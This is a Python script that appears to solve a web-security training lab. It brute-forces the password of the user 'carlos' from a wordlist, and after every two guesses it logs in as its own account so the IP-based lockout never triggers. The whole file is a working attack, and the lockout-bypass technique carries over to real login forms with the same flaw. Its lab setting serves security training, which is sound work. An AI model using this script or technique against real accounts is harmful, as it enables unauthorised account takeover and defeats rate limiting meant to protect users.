import requests
from colorama import Fore, Style, init
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        init()
        self.passwords_file = 'passwords.txt'
        self.passwords = []
        self.victim_username = 'carlos'
        self.my_username = 'wiener'
        self.my_password = 'peter'

    def open_passwords_file(self):
        with open(self.passwords_file) as file:
            for password in file.readlines():
                password = password.strip()
                self.passwords.append(password)

    def reset_ip_blocking(self):
        data = {
            'username': self.my_username,
            'password': self.my_password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def enumerate_passwords(self):
        i = 0
        for password in self.passwords:
            if i == 2:
                self.reset_ip_blocking()
                i = 0
            data = {
                'username': self.victim_username,
                'password': password
            }
            response = self.session.post(self.lab_url + 'login', data=data)
            if 'Incorrect password' not in response.text:
                print(Fore.GREEN + f'[+] {self.victim_username}:{password}' + Style.RESET_ALL)
                break
            else:
                print(Fore.RED + f'[-] {self.victim_username}:{password}' + Style.RESET_ALL)
            i += 1

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.reset_ip_blocking()
        self.open_passwords_file()
        self.enumerate_passwords()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
